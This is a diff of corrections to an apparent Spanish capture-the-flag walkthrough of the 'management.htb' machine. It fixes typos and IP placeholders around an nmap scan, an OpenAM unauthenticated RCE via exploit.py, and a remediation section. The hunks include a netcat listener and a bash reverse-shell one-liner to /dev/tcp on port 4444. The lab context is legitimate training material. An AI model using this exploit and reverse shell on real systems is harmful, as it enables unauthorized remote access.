@@ -30,7 +30,7 @@ ping <TARGET_IP>
 
 **3. Añadir la IP a /etc/hosts con alias management.htb:**
 ```bash
-sudo nano /etc/hosts/
+sudo nano /etc/hosts
 <TARGET_IP> management.htb
 ```
 - Se añade la IP a /etc/hosts para traducir un nombre privado (como management.htb) a tu dirección IP real.
@@ -53,7 +53,7 @@ nmap -p- --min-rate=1000 -T4 -Pn <TARGET_IP> -oN escaneo.txt
 
 ```text
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-22 15:11 -0300
-Nmap scan report for management.htb (<LOCAL_IP>)
+Nmap scan report for management.htb (<TARGET_IP>)
 Host is up (0.18s latency).
 Not shown: 995 closed tcp ports (reset)
 PORT      STATE SERVICE     VERSION
@@ -106,7 +106,7 @@ Con el ```-sVC``` deducimos que hay subdominios sobre el dominio principal (*.ma
 
 **6. Añadir el subdominio de la IP Target a /etc/hosts con alias sso.management.htb:**
 ```bash
-sudo nano /etc/hosts/
+sudo nano /etc/hosts
 <TARGET_IP> management.htb sso.management.htb
 ```
 
@@ -355,7 +355,7 @@ uid=996(openam) gid=987(openam) groups=987(openam)
 
 - ```HTTP 200``` Significa que la ejecución fue éxitosa
 - El ```uid=996``` es el *USER ID*: un usuario interno sin privilegios de *root* llamado *openam.*
-- El ```gid=997``` es el *Group ID*: indica que el grupo principal que pertenece el usuario 996 y también se llama *openam.*
+- El ```gid=987``` es el *Group ID*: indica que el grupo principal que pertenece el usuario 996 y también se llama *openam.*
 - Finalmente el ```groups=987``` lista todos los grupos a los que pertenece la cuenta (en este caso únicamente a su propio grupo, osea el *openam*).
 
 en palabras sencillas tenemos básicamente un ***RCE sin autentificación*** como el usuario *openam*, algo que es sumamente peligroso en un sistema real y facilmente puede comprometer todo un sistema si es usado de mala manera.
@@ -368,7 +368,7 @@ nc -lvnp 4444
 acontinuación lanzamos el *payload* con un *reverse shell*
 ```bash
 python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
-  'bash -c "bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1"'
+  'bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/4444 0>&1"'
 ```
 
 **16. Ahora vemos el resultado y estabilizamos la shell**. Una vez ejecutado vamos a la terminal que tenga el listener y verificamos que efectivamente estamos dentro:
@@ -377,7 +377,7 @@ python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidat
 <summary>Ver output completo</summary>
 
 ```bash
-connect to [<TARGET_IP>] from (UNKNOWN) [<TU_IP>] 39740
+connect to [<LOCAL_IP>] from (UNKNOWN) [<TARGET_IP>] 39740
 bash: cannot set terminal process group (1727): Inappropriate ioctl for device
 bash: no job control in this shell
 openam@management:/$ █
@@ -435,8 +435,7 @@ changeit
 </details>
 ­­
 
-Intentamos extraer las claves secretas ```dsameuserpwd``` y ```configstorepwd``` del almacén de claves (*keystore*) mediante un pequeño programa en Java (dado que el sistema objetivo solo contaba con un *JRE* mínimo y carecía de *javac*), pero esta vía no condujo a nada útil en este equipo.
-En realidad, las credenciales se encontraban en ```GLPI```.
+Se revisaron los archivos de configuración de *OpenAM* en ```/opt/openam``` sin encontrar credenciales reutilizables para *SSH*, por lo que se continuó inspeccionando la instalación de *GLPI* en ```/opt/glpi```.
 
 **18. Análisis de GLPI**
 ```bash
@@ -596,7 +595,7 @@ Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)
   Swap usage:            0%
   Processes:             233
   Users logged in:       0
-  IPv4 address for eth0: **<TU_IP>**
+  IPv4 address for eth0: <TARGET_IP>
   IPv6 address for eth0: dead:beef::a0de:adff:fecd:e759
 Expanded Security Maintenance for Applications is not enabled.
 
@@ -708,6 +707,7 @@ Dado que el segundo parámetro ```--restrict-path /``` prevalece, la restricció
 ls -la /tmp/root_backup
 cat /tmp/root_backup/root.txt
 ```
+
 <details open>
 <summary>Ver output completo</summary>
 
@@ -733,7 +733,6 @@ owen@management:~$ cat /tmp/root_backup/root.txt
 ­­
 
 # Fase de Remediación y Mitigación
-Esta fase es totalmente adicional pero para mi es necesario aclarar esto.
 Para cerrar los vectores de ataque identificados durante la evaluación, se recomiendan las siguientes medidas técnicas:
 
 - **Actualización de OpenAM (`CVE-2026-33439`):**
